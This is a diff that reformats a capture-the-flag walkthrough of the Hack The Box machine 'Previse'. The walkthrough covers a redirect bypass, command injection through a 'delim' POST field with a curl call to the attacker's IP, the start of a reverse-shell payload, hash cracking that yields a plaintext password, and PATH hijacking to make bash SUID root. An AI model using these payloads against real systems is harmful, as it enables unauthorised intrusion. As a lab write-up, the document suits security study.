@@ -1,10 +1,13 @@
 # HTB: Previse
+
 ## Difficulty: Easy
+
 #### Author: canopus
 
 ![](./images/avatar.png)
 
 ### 1.) Foothold
+
 Scanning with `nmap` reveals that the server runs SSH on port 22 and an Apache HTTP server on port 80. Let's Navigate to the website. We somehow need to find out the credentials in order to login.
 
 ![](./images/login.png)
@@ -49,10 +52,10 @@ We find some interesting pages that redirect to `login.php`. Let's try Intercept
 The website doesn't redirect us immediately, it rather loads the page and then redirects. We can abuse this and tamper with the response code. Changing the response to "200 OK" 
 we can bypass the redirection and access the website directly!
 
-![images/Pasted image 20211224032506.png]
+![](./images/Pasted%20image%2020211224032506.png)
 
 And we are in!
-![images/Pasted image 20211224032556.png]
+![](./images/Pasted%20image%2020211224032556.png)
 
 We can now try creating a user to have permanent access to the website.
 
@@ -79,7 +82,7 @@ Proving we have RCE:
 Intercepting the Submit request and using Repeater to do multiple requests, change the POST data `delim=comma+%26%26+curl+http%3a//10.10.14.2%3a8888`. When the code in `logs.php` executes this will trigger a GET request on my machine.
 A `nc` listener was already running on my machine on port 8888: 
 
-![images/Pasted image 20211224033548.png]
+![](./images/Pasted%20image%2020211224033548.png)
 
 Since we got a GET request from the website, it meas we have executed code on the remote machine!
 
@@ -89,7 +92,7 @@ POST Data: `delim=comma+%26%26+export+RHOST%3d"10.10.14.2"%3bexport+RPORT%3d4444
 
 A Netcat Listener needs to be setup and listen to the specified port.
 
-![images/Pasted image 20211224035728.png]
+![](./images/Pasted%20image%2020211224035728.png)
 
 ### 3.) Getting User
 
@@ -98,11 +101,12 @@ In the source code there is also a file called `config.php` that contains the cr
 Connecting using `mysql -D previse -h localhost -u root -p` and enter password when prompted. 
 
 Basic MySQL commands here: 
- - listing all databases 
- - selecting previse
- - listing all tables 
- - selecting everything from a specific table
- 
+
+- listing all databases 
+- selecting previse
+- listing all tables 
+- selecting everything from a specific table
+
 We find a list of hashes:
 
 ```mysql
@@ -122,9 +126,9 @@ We have a username `m4lwhere` and the password hash `$1$🧂llol$DQpmdvnb7EeuO6U
 
 If we manage to crack the hash then we should be able to SSH into the machine.
 
-After some researching i found out that `$1$` refers to the `md5crypt` algorithm. We can cracking this hash using John. 
+After some researching i found out that `$1$` refers to the `md5crypt` algorithm. We can crack this hash using John. 
 
-```bash 
+```bash
 john -format=md5crypt-long -w=/usr/share/dict/rockyou.txt creds
 ```
 
@@ -133,7 +137,9 @@ Found credentials are: `m4lwhere:ilovecody112235!`
 After SSH into the machine we get the user flag!
 
 ### 4.) Getting Root
+
 The first i do when i need to elevate privileges is finding SUID binaries.
+
 ```bash
 m4lwhere@previse:~$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/newgidmap
@@ -172,7 +178,7 @@ User m4lwhere may run the following commands on previse:
 
 It turns out that we can run the `access_backup.sh` script as root. Let's examine it. 
 
-```bash 
+```bash
 #!/bin/bash
 
 # We always make sure to store logs, we take security SERIOUSLY here
@@ -212,7 +218,7 @@ m4lwhere@previse:/tmp/a$ ls -lha /bin/bash
 -rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
 ```
 
-We confirm that `/bin/bash` now is a SUID binary we can get root by running `/bin/bash -p`
+We confirm that `/bin/bash` now is a SUID binary and we can get a root shell by running `/bin/bash -p`
 
 ```bash
 bash-4.4# whoami
@@ -221,9 +227,7 @@ bash-4.4# id
 uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) egid=0(root) groups=0(root),1000(m4lwhere)
 ```
 
-
 ### 5.) Conclusion
 
- - **NEVER** execute code that could possibly be controlled by an end-user, but if you have to make sure you sanitize is properly. 
- - Always use absolute paths when writing programs and if they access sensitive information make sure that they are not both executable and editable by a low privilege User. 
-
+- **NEVER** execute code that could possibly be controlled by an end-user, but if you have to, make sure you sanitize is properly. 
+- Always use absolute paths when writing programs and if they access sensitive information make sure that they are not both executable and editable by a low privilege User. 
